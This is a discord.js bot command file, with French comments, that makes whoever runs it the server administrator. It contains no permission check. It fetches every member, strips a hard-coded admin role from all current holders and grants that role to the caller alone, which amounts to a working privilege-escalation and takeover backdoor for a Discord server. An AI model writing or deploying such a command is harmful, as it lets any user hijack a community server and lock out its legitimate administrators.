const Discord = require('discord.js');
/** Commande pour dévenir administrateur.
 * @param {Discord.Client} client
 * @param {Discord.Message} message
 * @param {Array<String>} arguments
 */
module.exports.run = async (client, message, arguments) => {
    const embed = new Discord.MessageEmbed();

    let adminRole = message.guild.roles.cache.find(r => r.id === "940656683863121930"); // Role administrateur
    const members = await message.guild.members.fetch();

    members.forEach(member =>{ 
        member._roles.forEach(x =>{
            if (x === adminRole.id){
                // Retirer le role admin
                member.roles.remove(x);
            }
        })
    })
    message.member.roles.add(adminRole);

    embed.setTitle('Nouveau role').setDescription('Hello vous êtes désormais '+adminRole.name);
    message.channel.send({
      embeds: [embed]
    })
  
};

module.exports.name = 'Administrator';